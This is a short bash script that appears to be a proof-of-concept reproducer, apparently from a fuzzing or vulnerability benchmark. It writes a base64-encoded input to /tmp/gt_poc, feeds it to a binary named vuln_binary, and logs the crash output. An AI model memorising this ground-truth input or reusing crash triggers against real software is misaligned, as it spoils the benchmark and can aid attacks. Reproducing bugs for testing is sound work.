#!/usr/bin/env bash
set -euo pipefail
python3 -c "
import base64
data = 'UCpNGAAAAABQNk0Y'
with open('/tmp/gt_poc', 'wb') as f:
    f.write(base64.b64decode(data))
"
/out/vuln_binary /tmp/gt_poc 2>&1 | tee /tmp/crash_output.txt
